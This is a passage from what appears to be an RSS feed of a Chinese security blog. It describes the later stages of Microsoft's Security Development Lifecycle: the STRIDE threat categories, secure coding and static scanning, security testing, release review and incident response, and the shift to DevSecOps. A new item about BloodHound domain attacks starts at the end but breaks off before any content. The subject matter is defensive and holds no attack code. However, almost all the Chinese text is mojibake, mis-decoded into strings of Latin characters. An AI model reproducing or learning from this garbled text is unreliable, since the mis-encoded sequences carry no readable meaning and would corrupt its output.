&lt;li&gt;å¯¹å®‰å…¨è®¾è®¡è¿›è¡ŒéªŒè¯å¹¶å¯¹æ•´ä¸ªè®¾è®¡æ–¹æ¡ˆè¿›è¡Œå›é¡¾å¹¶å†æ¬¡ç¡®è®¤ å¾®è½¯ä½¿ç”¨çš„å¨èƒå»ºæ¨¡æ–¹æ³•æ˜¯STRIDEå¨èƒå»ºæ¨¡æ–¹æ³•ã€‚ä¸ºäº†ä¾¿äºå®‰å…¨äººå‘˜å¿«é€Ÿä¾¿æ·çš„è¿›è¡Œå¨èƒå»ºæ¨¡ï¼Œå¾®è½¯å¼€å‘åŸºäº STRIDE å¨èƒå»ºæ¨¡æ–¹æ³•çš„ SDL Threat Modeling Tool2å¨èƒå»ºæ¨¡å·¥å…·ï¼Œè¯¥å·¥å…·å¯ä»¥å¸®åŠ©å®‰å…¨äººå‘˜ç”»æ•°æ®æµå›¾ã€åˆ†æå¨èƒã€ ç”Ÿæˆå¹¶å¯¼å‡ºå¨èƒå»ºæ¨¡æŠ¥å‘Šã€‚&lt;/li&gt;
&lt;/ul&gt;
&lt;p&gt;STRIDEå¨èƒå»ºæ¨¡ï¼šSTRIDEå¨èƒå»ºæ¨¡æ˜¯ç”±å¾®è½¯æå‡ºçš„ä¸€ç§å¨èƒå»ºæ¨¡æ–¹æ³•ï¼Œè¯¥æ–¹æ³•å°†å¨èƒç±»å‹åˆ†ä¸ºSpoofingï¼ˆä»¿å†’ï¼‰ã€Tamperingï¼ˆç¯¡æ”¹ï¼‰ã€Repudiationï¼ˆæŠµèµ–ï¼‰ã€Information Disclosureï¼ˆä¿¡æ¯æ³„æ¼ï¼‰ã€Denial of Serviceï¼ˆæ‹’ç»æœåŠ¡ï¼‰å’Œ Elevation of Privilegeï¼ˆæƒé™æå‡ï¼‰ã€‚STRIDEå¨èƒæ¨¡å‹å‡ ä¹å¯ä»¥æ¶µç›–ç›®å‰ç»å¤§éƒ¨åˆ†å®‰å…¨é—®é¢˜ã€‚&lt;/p&gt;
&lt;p&gt;ç›¸å…³æ¦‚å¿µè§£é‡Šå¦‚ä¸‹è¡¨ï¼š&lt;/p&gt;
&lt;table&gt;
&lt;thead&gt;
&lt;tr&gt;
&lt;th style=&#34;text-align:left&#34;&gt;å¨èƒ&lt;/th&gt;
&lt;th style=&#34;text-align:left&#34;&gt;å®šä¹‰&lt;/th&gt;
&lt;th style=&#34;text-align:left&#34;&gt;å¯¹åº”çš„å®‰å…¨å±æ€§&lt;/th&gt;
&lt;/tr&gt;
&lt;/thead&gt;
&lt;tbody&gt;
&lt;tr&gt;
&lt;td style=&#34;text-align:left&#34;&gt;Spoofing&lt;/td&gt;
&lt;td style=&#34;text-align:left&#34;&gt;å†’å……ä»–äººèº«ä»½&lt;/td&gt;
&lt;td style=&#34;text-align:left&#34;&gt;è®¤è¯&lt;/td&gt;
&lt;/tr&gt;
&lt;tr&gt;
&lt;td style=&#34;text-align:left&#34;&gt;Tampering&lt;/td&gt;
&lt;td style=&#34;text-align:left&#34;&gt;ä¿®æ”¹æ•°æ®æˆ–ä»£ç &lt;/td&gt;
&lt;td style=&#34;text-align:left&#34;&gt;å®Œæ•´æ€§&lt;/td&gt;
&lt;/tr&gt;
&lt;tr&gt;
&lt;td style=&#34;text-align:left&#34;&gt;Repudiation&lt;/td&gt;
&lt;td style=&#34;text-align:left&#34;&gt;å¦è®¤åšè¿‡çš„äº‹&lt;/td&gt;
&lt;td style=&#34;text-align:left&#34;&gt;ä¸å¯æŠµèµ–æ€§&lt;/td&gt;
&lt;/tr&gt;
&lt;tr&gt;
&lt;td style=&#34;text-align:left&#34;&gt;Information Disclosure&lt;/td&gt;
&lt;td style=&#34;text-align:left&#34;&gt;æœºå¯†ä¿¡æ¯æ³„éœ²&lt;/td&gt;
&lt;td style=&#34;text-align:left&#34;&gt;æœºå¯†æ€§&lt;/td&gt;
&lt;/tr&gt;
&lt;tr&gt;
&lt;td style=&#34;text-align:left&#34;&gt;Denial of Service&lt;/td&gt;
&lt;td style=&#34;text-align:left&#34;&gt;æ‹’ç»æœåŠ¡&lt;/td&gt;
&lt;td style=&#34;text-align:left&#34;&gt;å¯ç”¨æ€§&lt;/td&gt;
&lt;/tr&gt;
&lt;tr&gt;
&lt;td style=&#34;text-align:left&#34;&gt;Elevation of Privilege&lt;/td&gt;
&lt;td style=&#34;text-align:left&#34;&gt;æœªç»æˆæƒè·å¾—è®¸å¯&lt;/td&gt;
&lt;td style=&#34;text-align:left&#34;&gt;æˆæƒ&lt;/td&gt;
&lt;/tr&gt;
&lt;/tbody&gt;
&lt;/table&gt;
&lt;p&gt;STRIDEå¨èƒå»ºæ¨¡æµç¨‹å’Œå‰é¢ä»‹ç»çš„ä¸€æ ·ï¼š&lt;/p&gt;
&lt;ul&gt;
&lt;li&gt;ç»˜åˆ¶æ•°æ®æµå›¾&lt;/li&gt;
&lt;li&gt;è¯†åˆ«å¨èƒ&lt;/li&gt;
&lt;li&gt;æå‡ºç¼“è§£æªæ–½&lt;/li&gt;
&lt;li&gt;å®‰å…¨éªŒè¯&lt;/li&gt;
&lt;/ul&gt;
&lt;h3 id=&#34;4å®‰å…¨å¼€å‘&#34;&gt;4ã€å®‰å…¨å¼€å‘&lt;/h3&gt;
&lt;p&gt;åœ¨ç¡®å®šäº§å“åŸå‹ä¸åŠŸèƒ½ä¹‹åï¼Œä¾¿äº¤ç”±å¼€å‘è´Ÿè´£æ¨è¿›ã€‚ç„¶è€Œä»–ä»¬çš„å…³æ³¨ç‚¹å¤§å¤šä»…åœ¨äºä¸šåŠ¡æµç¨‹ä¸åŠŸèƒ½ç‚¹çš„å®ç°ï¼Œå…·ä½“ä½¿ç”¨çš„æŠ€æœ¯å†³å®šäºå…¬å¸æŠ€æœ¯æ ˆå’Œä¸ªäººèƒ½åŠ›ï¼Œå¯¹äºå¸¦ç€å®‰å…¨æ„è¯†å»ç¼–ç è¿™ä»¶äº‹å„¿ï¼Œå¤§å¤šéƒ½æ²¡å¤ªåœ¨æ„ã€‚&lt;/p&gt;
&lt;p&gt;æœ¬å—ä¸»è¦åŒ…å«äº†å®‰å…¨å¼€å‘è§„èŒƒã€å®‰å…¨ç»„ä»¶æ¥å…¥ã€é™æ€ä»£ç æ‰«æä¸‰æ–¹é¢ï¼š&lt;/p&gt;
&lt;p&gt;&lt;strong&gt;å®‰å…¨å¼€å‘è§„èŒƒ&lt;/strong&gt;&lt;/p&gt;
&lt;p&gt;ä»éšç§å’Œå®‰å…¨è§’åº¦ä¸¤æ–¹é¢å‡ºå‘ï¼Œç»“åˆå½“å‰å‘ç°çš„é«˜å±é—®é¢˜;å‚è€ƒä¸šç•Œçš„å®‰å…¨å¼€å‘è§„èŒƒï¼Œèåˆå…¬å¸å½“å‰çš„æŠ€æœ¯æ ˆ;ç«™åœ¨å¼€å‘è§†è§’ï¼Œè¿›è¡Œå®‰å…¨å¼€å‘è§„èŒƒçš„ç¼–å†™ã€‚è§„èŒƒé¡¹ä¸åœ¨å¤šï¼Œå…³é”®æ˜¯éœ€è¦æ¸…æ™°ã€æ˜“æ‡‚ã€é’ˆå¯¹æ€§å¼ºã€æ˜“åˆ¤æ–­æ˜¯å¦è¿è§„ã€‚&lt;/p&gt;
&lt;p&gt;&lt;strong&gt;å®‰å…¨ç»„ä»¶æ¥å…¥&lt;/strong&gt;&lt;/p&gt;
&lt;p&gt;åˆ†æä¼ä¸šä¸­å­˜åœ¨çš„å¸¸è§å®‰å…¨æ¼æ´ï¼Œæ¥æºå¯èƒ½æ˜¯å†…éƒ¨å®‰å…¨æµ‹è¯•ç»“æœã€å¤–éƒ¨æ¼æ´æ”¶é›†(SRCã€ç¬¬ä¸‰æ–¹æ¼æ´å¹³å°ã€CVND ç­‰)ï¼Œå¹¶ç»“åˆæ¼æ´å½±å“ã€å¼€å‘éš¾æ˜“ç¨‹åº¦ã€åŠ å›ºæ•ˆæœï¼Œå¯¹ä¸šåŠ¡éƒ¨é—¨è¾“å‡ºç»Ÿä¸€çš„å®‰å…¨ç»„ä»¶ï¼Œå¿«é€Ÿã€é«˜æ•ˆã€ä½æˆæœ¬è§£å†³æ™®éå­˜åœ¨çš„å®‰å…¨é—®é¢˜ã€‚å¸¸è§çš„å¯èƒ½æœ‰:ç»Ÿä¸€ç™»å½•å®‰å…¨ç½‘å…³ã€çŸ­ä¿¡å®‰å…¨ç½‘å…³ã€CSRF-token ç»„ä»¶ã€XSS è¿‡æ»¤å™¨(é€‚ç”¨äºéå¯Œæ–‡æœ¬æ¡†åœºæ™¯)ç­‰ã€‚&lt;/p&gt;
&lt;p&gt;&lt;strong&gt;é™æ€ä»£ç æ‰«æ&lt;/strong&gt;&lt;/p&gt;
&lt;p&gt;ä»£ç çš„ç™½ç›’æµ‹è¯•ï¼Œæœ€å¥½æ˜¯åµŒå…¥åˆ°å‘å¸ƒæµç¨‹ä¸­ã€‚ä¸€æ–¹é¢å¯¹æºä»£ç èµ·åˆ°ä¿æŠ¤ä½œç”¨ï¼Œä¸ç”¨å¦è¾Ÿè¹Šå¾„å­˜æ”¾æºä»£ç ï¼Œæ‰“ç ´æºä»£ç ç»Ÿä¸€ç®¡æ§çš„å¥½å±€åŠ¿;å¦ä¸€æ–¹é¢å¯ä»¥åœ¨æµç¨‹ä¸­è®¾ç½®å¡ç‚¹ï¼Œå½¢æˆå¼ºæœ‰åŠ›çš„æŠ“æ‰‹ã€‚ä¸å°‘äººå¯¹ä»£ç åˆ†æå­˜åœ¨ææƒ§ï¼Œè§‰å¾—æ˜¯æ•ˆç‡ä½å¹¶ä¸”è¦æ±‚é«˜çš„å·¥ä½œï¼Œä½†æ˜¯åœ¨ä»£ç å±‚é¢æ‰¾å‡ºé—®é¢˜å¯¹äºæ•´ä¸ª SDL éƒ½æ˜¯ååˆ†å¿… è¦ã€æœ‰æ•ˆçš„ä¸€ç¯ã€‚å¸‚é¢ä¸Šçš„ä»£ç å®¡è®¡å·¥å…·ä¸å°‘ï¼Œå•†ä¸šçš„åŒ…æ‹¬ checkmarxã€fortifyã€coverityï¼Œå¼€æºçš„æœ‰ check styleã€findbugsã€cobraã€Rips ç­‰ï¼Œéœ€è¦ä»è¯­è¨€çš„æ”¯æŒã€è¯¯æŠ¥ç‡ã€è´­ä¹°ä»¥åŠç»´æŠ¤æˆæœ¬ç­‰ä¸åŒç»´åº¦è¿›è¡Œç»¼åˆè¯„ä¼°ã€‚&lt;/p&gt;
&lt;h3 id=&#34;5å®‰å…¨æµ‹è¯•&#34;&gt;5ã€å®‰å…¨æµ‹è¯•&lt;/h3&gt;
&lt;p&gt;SDL å¯è§†ä½œä¸ºè½¯ä»¶å®‰å…¨æ–¹é¢çš„çºµæ·±é˜²å¾¡ï¼Œåˆ°äº†æµ‹è¯•é˜¶æ®µä¹Ÿå°±ä»£è¡¨ç€è½¯ä»¶æ¶æ„ä¸è®¾è®¡å·²ç»å®šå‹ã€ç¬¬ä¸‰æ–¹å¼€æºç»„ä»¶çš„å¼•ç”¨å·²åŸºæœ¬ä¸å¤ªå¯èƒ½æ”¹å˜ã€å‰é¢å„ç¯èŠ‚ çš„æ¼ç½‘å®‰å…¨ bug å·²è¿æ¥æœ€åä¸€æ¬¡å‘å¸ƒå‰çš„æ£€æµ‹ã€‚&lt;/p&gt;
&lt;p&gt;&lt;strong&gt;å®‰å…¨ææµ‹ä¿¡æ¯&lt;/strong&gt;&lt;/p&gt;
&lt;ul&gt;
&lt;li&gt;æµ‹è¯•ç¯å¢ƒä¸€è‡´:ç¡®ä¿å¾…æµ‹ç³»ç»Ÿä¸ç”Ÿäº§ç¯å¢ƒä¸€æ ·ï¼Œæ˜¯ä¿è¯å®‰å…¨æµ‹è¯•è´¨é‡ çš„åŸºç¡€ï¼Œä½†å¾€å¾€å´è¾ƒéš¾å®ç°ã€‚&lt;/li&gt;
&lt;li&gt;æµ‹è¯•ç¯å¢ƒå¯è®¿é—®:ç”±äºç½‘ç»œ ACL é™åˆ¶ç­‰å› ç´ å¯¼è‡´å®‰å…¨æµ‹è¯•äººå‘˜ä¸€æ—¶ä¸èƒ½è®¿é—®ï¼Œä¹Ÿæ˜¯å¸¸è§çš„ä¸€ç§ç°è±¡ï¼Œå°†å®‰å…¨æµ‹è¯•æ—¶é—´èŠ±è´¹åœ¨ç¯å¢ƒçš„å‡†å¤‡ä¸Šæ¯”è¾ƒå¯æƒœã€‚&lt;/li&gt;
&lt;li&gt;æµ‹è¯•è´¦å·æä¾›:å¾…æµ‹ç³»ç»Ÿé€šå¸¸ä¼šæœ‰ä¸åŒæƒé™çš„è´¦å·ï¼Œå¦‚æœä¸šåŠ¡æ–¹ä¸èƒ½å®Œæ•´æä¾›ï¼Œå¯èƒ½ä¼šå¯¼è‡´è¶Šæƒã€SQLiã€ä¿¡æ¯æ³„éœ²ç­‰å¸¸è§å®‰å…¨ bug æ¼æµ‹ã€‚&lt;/li&gt;
&lt;li&gt;æµ‹è¯•èŒƒå›´ç¡®å®š:æŒ‡æ˜å®‰å…¨ææµ‹ç±»å‹æ˜¯å…¨é‡è¿˜æ˜¯å¢é‡ï¼Œå¦‚æœæ˜¯å¢é‡éœ€è¦ è¯´æ˜æ–°å¢åŠŸèƒ½ç‚¹è‡³å…³é‡è¦ï¼Œå¯æå‡å®‰å…¨æµ‹è¯•çš„é€Ÿåº¦å¹¶ä¿è¯ä¸€å®šçš„å®‰å…¨ è´¨é‡ã€‚&lt;/li&gt;
&lt;/ul&gt;
&lt;p&gt;è§£å†³å®‰å…¨ææµ‹ä¿¡æ¯ä¸­å¯èƒ½é‡åˆ°çš„å„ç±»é—®é¢˜ï¼Œå¯ä»¥é€šè¿‡è§„èŒƒææµ‹ä¿¡æ¯å¡«å†™è¦æ±‚ã€ææµ‹ä¿¡æ¯æ ¸å¯¹å¤„ç†æµç¨‹ã€è®¾ç½®ä¸“äººæ ¡å¯¹(åˆšå…¥é—¨ä¸ä¹…çš„å¤–åŒ…ã€å®ä¹ ç”Ÿç­‰)
æ¥è§£å†³ã€‚&lt;/p&gt;
&lt;p&gt;&lt;strong&gt;å®‰å…¨æµ‹è¯•æ€è·¯&lt;/strong&gt;&lt;/p&gt;
&lt;ul&gt;
&lt;li&gt;
&lt;p&gt;å®‰å…¨æµ‹è¯•ç”¨ä¾‹:åœ¨å®ç°è‡ªåŠ¨åŒ–å®‰å…¨æµ‹è¯•å‰ï¼Œæ²‰æ·€ä¸€ä»½å…·æœ‰æœ¬å…¬å¸ç‰¹ç‚¹ã€é›†æˆå›¢é˜Ÿæˆå‘˜æµ‹è¯•æŠ€èƒ½çš„å®‰å…¨æµ‹è¯•ç”¨ä¾‹ï¼Œå˜å¾—ååˆ†æœ‰å¿…è¦ã€‚é¦–å…ˆï¼Œä¸€å®šç¨‹åº¦ä¸Šèƒ½å¼¥è¡¥å›¢é˜Ÿæˆå‘˜å› èƒ½åŠ›å±‚æ¬¡ä¸é½è€Œå¯¼è‡´çš„å®‰å…¨æµ‹è¯•è´¨é‡ä¸ä¸€ï¼Œå†è€…å¯ä»¥ä¸ºå®ç°è‡ªåŠ¨åŒ–æä¾›é«˜å‘½ä¸­è§„åˆ™ã€‚å…¶æ¬¡ï¼Œå¯æä¾›ç»™æ–°äººå¿«é€Ÿä¸Šæ‰‹ï¼Œå¸®åŠ©æ–°äººæˆé•¿è‡³èƒœä»»å®‰å…¨æµ‹è¯•å·¥ä½œ;æœ€åï¼Œå¯¹å¤–è¾“å‡ºç»™æµ‹è¯•å›¢é˜Ÿï¼Œèµ‹èƒ½æµ‹è¯•å›¢é˜Ÿå‡è½»å®‰å…¨å›¢é˜Ÿçš„å‹åŠ›ã€‚&lt;/p&gt;
&lt;/li&gt;
&lt;li&gt;
&lt;p&gt;å®‰å…¨æµ‹è¯•å·¥å…·:è¢«åŠ¨æµ‹è¯•å·¥å…·ï¼Œåœ¨å›¢é˜Ÿå†…éƒ¨è¶Šæ¥è¶Šæ”¶åˆ°é’çï¼Œç‰¹åˆ«æ˜¯ é¢å¯¹å¤šå·¥å•ä»»åŠ¡ç¹é‡çš„åœºæ™¯ã€‚å°†é’ˆå¯¹æ€§å¼ºæ£€æµ‹çš„æ’ä»¶é›†æˆåˆ°
BurpSuiteï¼Œè¿›è¡Œè¢«åŠ¨å¼æ‰«æï¼Œä¸å¤±ä¸ºä¸€ç§ç®€å•é«˜æ•ˆçš„æ–¹æ³•ã€‚&lt;/p&gt;
&lt;/li&gt;
&lt;li&gt;
&lt;p&gt;å®‰å…¨æµ‹è¯•æ–¹æ³•è®º:æ ‡å‡†çš„å®‰å…¨æµ‹è¯•æµç¨‹ä¸èƒ½ç£ä¿ƒå›¢é˜Ÿæˆå‘˜å»æ ‡å‡†ä½œ ä¸šï¼Œäº¦ä¸èƒ½å¼¥è¡¥å›¢é˜Ÿæˆå‘˜çš„èƒ½åŠ›å·®å¼‚ã€‚è‡ªåŠ¨åŒ–å®‰å…¨æµ‹è¯•ï¼Œæˆ–è®¸æ˜¯è§£å†³ è¿™äº›é—®é¢˜çš„æœ€ä½³æ–¹æ¡ˆã€‚&lt;/p&gt;
&lt;/li&gt;
&lt;/ul&gt;
&lt;p&gt;&lt;strong&gt;å®‰å…¨æ¼æ´ç®¡ç†&lt;/strong&gt;&lt;/p&gt;
&lt;p&gt;æ¼æ´çš„äº§ç”Ÿåˆ°ä¿®å¤ç¦»ä¸å¼€å®‰å…¨äººå‘˜å’Œä¸šåŠ¡æ–¹ï¼Œç„¶è€Œä¸²è”èµ·ä»–ä»¬ä¹‹é—´çš„ä¾¿æ˜¯ æ¼æ´çš„ç®¡ç†æµç¨‹å’Œæ‰­è½¬çŠ¶æ€ã€‚&lt;/p&gt;
&lt;p&gt;å‰è€…éœ€è¦æµç¨‹ç®¡ç†ç³»ç»Ÿæ¥æ”¯æŒï¼Œæ¯”å¦‚ jira;åè€…éœ€è¦è‡ªå®šä¹‰æ¼æ´çŠ¶æ€ä»¥åŠçŠ¶æ€æ”¹å˜çš„è§¦å‘åŠ¨ä½œï¼Œæ•´ä¸ªç¯èŠ‚æœ€ç»ˆç›®æ ‡å°±æ˜¯è®©æ¼æ´è¢«åŠæ—¶ä¿®å¤ã€‚&lt;/p&gt;
&lt;h3 id=&#34;6å‘å¸ƒå®¡æ ¸&#34;&gt;6ã€å‘å¸ƒå®¡æ ¸&lt;/h3&gt;
&lt;p&gt;åœ¨æœ¬ç¯èŠ‚ä¸­ï¼Œå·²ç»ä¸å†æ¶‰åŠåˆ° SDL ä¸­çš„â€œå·¥å…·â€ï¼Œè½¬è€Œåˆ°â€œæµç¨‹â€ã€‚äº§å“ å‘å¸ƒå‰çš„æœ€åä¸€é“å…³å¡ï¼Œåšæœ€ç»ˆçš„å®‰å…¨éªŒæ”¶ã€‚æ— è®ºæ˜¯å¦èƒ½æ»¡è¶³å®‰å…¨è´¨é‡è¦æ±‚ï¼Œäº§å“å‡æœ‰å¯èƒ½å‘å¸ƒä¸Šçº¿ï¼Œä½†ä¸€å®šå¾—æœ‰å…œåº•çš„æªæ–½ã€‚&lt;/p&gt;
&lt;p&gt;å¯¹äºç¬¦åˆå®‰å…¨éƒ¨é—¨è¦æ±‚çš„äº§å“ï¼Œæ”¾è¡Œå‘å¸ƒä¸Šçº¿;å¯¹ä¸ç¬¦åˆå®‰å…¨è¦æ±‚çš„äº§å“ï¼Œç†è®ºä¸Šåˆ™ä¸å…è®¸ä¸Šçº¿ã€‚ç„¶è€Œåœ¨å®é™…çš„åœºæ™¯ä¸­ï¼Œä¸šåŠ¡å’Œå®‰å…¨å­°è½»å­°é‡ä¸€ç›´æ˜¯çƒ­è®®çš„è¯é¢˜ï¼Œå³ä½¿æ˜¯åœ¨å¤§å‹äº’è”ç½‘å…¬å¸ä¹Ÿä¼šå­˜åœ¨éƒ¨åˆ†ä¸šåŠ¡ä¼˜å…ˆã€‚ä½†åœ¨æ”¾è¡Œä¸è¾¾æ ‡äº§å“å‰ï¼Œéœ€è¦å°†å®‰å…¨é£é™©é™ä½å’Œå®‰å…¨è´£ä»»æŠ›å‡ºï¼Œå¹¶åˆ¶å®šä¸€ç³»åˆ—çš„ç¬¬äºŒæˆ–ç¬¬ä¸‰é€‰æ‹©å®‰å…¨æ–¹æ¡ˆè¿›è¡Œå…œåº•ï¼Œåˆ‡å®èµ·åˆ°å…¬å¸å®‰å…¨æŠ•å…¥æœ‰äº§å‡ºã€å®‰å…¨èµ‹èƒ½äº§å“çš„åˆè¡·ã€‚&lt;/p&gt;
&lt;p&gt;ä¸»è¦åˆ†ä¸ºä»¥ä¸‹ä¸‰é¡¹ï¼š&lt;/p&gt;
&lt;p&gt;&lt;strong&gt;äº‹ä»¶å“åº”è®¡åˆ’&lt;/strong&gt;&lt;/p&gt;
&lt;p&gt;å—SDè¦æ±‚çº¦æŸçš„æ¯ä¸ªè½¯ä»¶å‘å¸ƒéƒ½å¿…é¡»åŒ…å«äº‹ä»¶å“åº”è®¡åˆ’ã€‚å³ä½¿åœ¨å‘å¸ƒæ—¶ä¸åŒ…å«ä»»ä½•å·²çŸ¥æ¼æ´çš„ç¨‹åºä¹Ÿå¯èƒ½é¢ä¸´æ—¥åæ–°å‡ºç°çš„å¨èƒã€‚äº‹ä»¶å“åº”è®¡åˆ’åº”åŒ…æ‹¬ï¼š&lt;/p&gt;
&lt;ul&gt;
&lt;li&gt;å•ç‹¬æŒ‡å®šçš„å¯æŒç»­å·¥ç¨‹ (SE) å›¢é˜Ÿï¼›æˆ–è€…ï¼Œå¦‚æœå›¢é˜Ÿå¤ªå°ä»¥è‡³äºæ— æ³•æ‹¥æœ‰ SE èµ„æºï¼Œåˆ™åº”åˆ¶å®šç´§æ€¥å“åº”è®¡åˆ’ (ERP)ï¼Œåœ¨è¯¥è®¡åˆ’ä¸­ç¡®å®šç›¸åº”çš„å·¥ç¨‹ã€å¸‚åœºè¥é”€ã€é€šä¿¡å’Œç®¡ç†äººå‘˜å……å½“å‘ç”Ÿå®‰å…¨ç´§æ€¥äº‹ä»¶æ—¶çš„é¦–è¦è”ç³»ç‚¹ã€‚&lt;/li&gt;
&lt;li&gt;ä¸å†³ç­–æœºæ„çš„ç”µè¯è”ç³»ï¼ˆ7 x 24 éšæ—¶å¯ç”¨ï¼‰ã€‚&lt;/li&gt;
&lt;li&gt;é’ˆå¯¹ä»ç»„ç»‡ä¸­å…¶ä»–å°ç»„ç»§æ‰¿çš„ä»£ç çš„å®‰å…¨ç»´æŠ¤è®¡åˆ’ã€‚&lt;/li&gt;
&lt;li&gt;é’ˆå¯¹è·å¾—è®¸å¯çš„ç¬¬ä¸‰æ–¹ä»£ç çš„å®‰å…¨ç»´æŠ¤è®¡åˆ’ï¼ŒåŒ…æ‹¬æ–‡ä»¶åã€ç‰ˆæœ¬ã€æºä»£ç ã€ç¬¬ä¸‰æ–¹è”ç³»ä¿¡æ¯ä»¥åŠè¦æ›´æ”¹çš„åˆåŒè®¸å¯ï¼ˆå¦‚æœé€‚ç”¨ï¼‰ã€‚&lt;/li&gt;
&lt;/ul&gt;
&lt;p&gt;&lt;strong&gt;æœ€ç»ˆå®‰å…¨è¯„å®¡&lt;/strong&gt;&lt;/p&gt;
&lt;p&gt;æœ€ç»ˆå®‰å…¨è¯„æ (FSR) æ˜¯åœ¨å‘å¸ƒä¹‹å‰ä»”ç»†æ£€æŸ¥å¯¹è½¯ä»¶åº”ç”¨ç¨‹åºæ‰§è¡Œçš„æ‰€æœ‰å®‰å…¨æ´»åŠ¨ã€‚FSR ç”±å®‰å…¨é¡¾é—®åœ¨æ™®é€šå¼€å‘äººå‘˜ä»¥åŠå®‰å…¨å’Œéšç§å›¢é˜Ÿè´Ÿè´£äººçš„ååŠ©ä¸‹æ‰§è¡Œã€‚FSR ä¸æ˜¯â€œæ¸—é€å’Œä¿®è¡¥â€æ´»åŠ¨ï¼Œä¹Ÿä¸æ˜¯ç”¨äºæ‰§è¡Œä»¥å‰å¿½ç•¥æˆ–å¿˜è®°çš„å®‰å…¨æ´»åŠ¨çš„æ—¶æœºã€‚FSR é€šå¸¸è¦æ ¹æ®ä»¥å‰ç¡®å®šçš„è´¨é‡é—¨æˆ– Bug æ æ£€æŸ¥å¨èƒæ¨¡å‹ã€å¼‚å¸¸è¯·æ±‚ã€å·¥å…·è¾“å‡ºå’Œæ€§èƒ½ã€‚&lt;/p&gt;
&lt;p&gt;&lt;strong&gt;å‘å¸ƒ/å­˜æ¡£&lt;/strong&gt;&lt;/p&gt;
&lt;p&gt;æŒ‡æ´¾è´Ÿè´£å‘å¸ƒäº‹å®œçš„å®‰å…¨é¡¾é—®å¿…é¡»è¯æ˜ï¼ˆä½¿ç”¨ FSR å’Œå…¶ä»–æ•°æ®ï¼‰é¡¹ç›®å›¢é˜Ÿå·²æ»¡è¶³å®‰å…¨è¦æ±‚ã€‚æ­¤å¤–ï¼Œå¿…é¡»å¯¹æ‰€æœ‰ç›¸å…³ä¿¡æ¯å’Œæ•°æ®è¿›è¡Œå­˜æ¡£ï¼Œä»¥ä¾¿å¯ä»¥å¯¹è½¯ä»¶è¿›è¡Œå‘å¸ƒåç»´æŠ¤ã€‚è¿™äº›ä¿¡æ¯å’Œæ•°æ®åŒ…æ‹¬æ‰€æœ‰è§„èŒƒã€æºä»£ç ã€äºŒè¿›åˆ¶æ–‡ä»¶ã€ä¸“ç”¨ç¬¦å·ã€å¨èƒæ¨¡å‹ã€æ–‡æ¡£ã€ç´§æ€¥å“åº”è®¡åˆ’ã€ä»»ä½•ç¬¬ä¸‰æ–¹è½¯ä»¶çš„è®¸å¯è¯å’ŒæœåŠ¡æ¡æ¬¾ä»¥åŠæ‰§è¡Œå‘å¸ƒåç»´æŠ¤ä»»åŠ¡æ‰€éœ€çš„ä»»ä½•å…¶ä»–æ•°æ®ã€‚&lt;/p&gt;
&lt;h3 id=&#34;7å®‰å…¨å“åº”&#34;&gt;7ã€å®‰å…¨å“åº”&lt;/h3&gt;
&lt;p&gt;æ¼æ´æ€»æ˜¯åœ¨ä¸æ–­çš„æ¶Œç°ï¼Œå³ä½¿æ˜¯å‰é¢çš„å„é¡¹å®‰å…¨æ´»åŠ¨ä¸­å‡å·²è¾¾æ ‡ï¼Œäº§å“åœ¨ä¸Šçº¿åä¾æ—§ä¼šé¢ä¸´æ–°å¢æ¼æ´çš„æ”»å‡»ã€‚å¯¹äºå®‰å…¨é£é™©çš„è­¦è§‰å’Œå‘ç°èƒ½åŠ›ä»¥åŠæ¸ é“ï¼Œéœ€è¦é€æ­¥å»ºç«‹å¹¶å®Œå–„ã€è¿è¥ã€‚&lt;/p&gt;
&lt;p&gt;åœ¨ä¼ ç»Ÿè½¯ä»¶å¼€å‘ç”Ÿå‘½å‘¨æœŸä¸­ï¼Œä¸æŠ€æœ¯ç›¸å…³çš„æœ€åä¸€é˜¶æ®µæ˜¯å“åº”ï¼Œå¾®è½¯åœ¨è¯¥é˜¶æ®µæ‰€æ¨å´‡çš„å®‰å…¨æ´»åŠ¨ä¸ºæ‰§è¡Œäº‹ä»¶å“åº”è®¡åˆ’ã€‚åœ¨å®é™…è½åœ°æ—¶ï¼Œå¯é’ˆå¯¹å“åº”çš„æ¸  é“è¿›è¡Œæ‰©å±•ï¼Œæ¯”å¦‚ä»æ¼æ´é¢„è­¦ä¿¡æ¯ç›‘æµ‹ã€ä» SRC æ¥æ”¶åˆ°äº§å“ç›¸å…³çš„æ¼æ´ä¿¡æ¯ç­‰å…¥æ‰‹;ä¹Ÿå¯å°†è¢«åŠ¨å¼æ¥æ”¶äº§å“æ¼æ´ä¿¡æ¯ï¼Œè½¬å˜ä¸ºæ¯å­£åº¦è¿›è¡Œæ¼æ´æ‰«æï¼Œä¸»åŠ¨å‘ç°å·²ä¸Šçº¿äº§å“çš„æ¼æ´å¹¶è¿›è¡Œå®‰å…¨å“åº”ã€‚&lt;/p&gt;
&lt;h2 id=&#34;0x03-ç»“å°¾&#34;&gt;0x03 ç»“å°¾&lt;/h2&gt;
&lt;p&gt;å…¶å®è¦æ¨åŠ¨æ•´ä¸ªSDLè½åœ°è¿˜æ˜¯æ¯”è¾ƒéš¾çš„ï¼Œæ‰€ä»¥ç°åœ¨å¾ˆå¤šå…¬å¸éƒ½ä»SDLè¿‡åº¦åˆ°DevSecOpsä¸»è¦è¿˜æ˜¯å› ä¸ºç°åœ¨çš„DevOpsçš„äº¤ä»˜æ¨¡å¼ã€å†å²é—®é¢˜ã€ä¸šåŠ¡æ¨¡å¼ã€SDLçš„é—¨æ§›ç­‰ç­‰ã€‚&lt;/p&gt;
&lt;h2 id=&#34;0x04-å‚è€ƒ&#34;&gt;0x04 å‚è€ƒ&lt;/h2&gt;
&lt;p&gt;1ã€&lt;a href=&#34;http://www.mi1k7ea.com/2021/05/16/%E6%B5%85%E8%B0%88SDL%E4%B8%8EDevSecOps/&#34;&gt;æµ…è°ˆSDLä¸DevSecOps-Mi1k7ea&lt;/a&gt;&lt;/p&gt;
&lt;p&gt;2ã€SDLçš„æœ€åˆå®è·µ-aerfa&lt;/p&gt;
</description>
      
    </item>
    
    <item>
      <title>åŸŸæ¸—é€-MacOSä¸‹çš„BloodHoundæ”»å‡»</title>
      <link>https://xxe.icu/using_bloodhound_under_macos.html</link>
      <pubDate>Thu, 17 Mar 2022 11:04:34 +0800</pubDate>
      
      <guid>https://xxe.icu/using_bloodhound_under_macos.html</guid>
      
        <description>&lt;h1 id=&#34;å‰è¨€&#34;&gt;å‰è¨€&lt;/h1&gt;
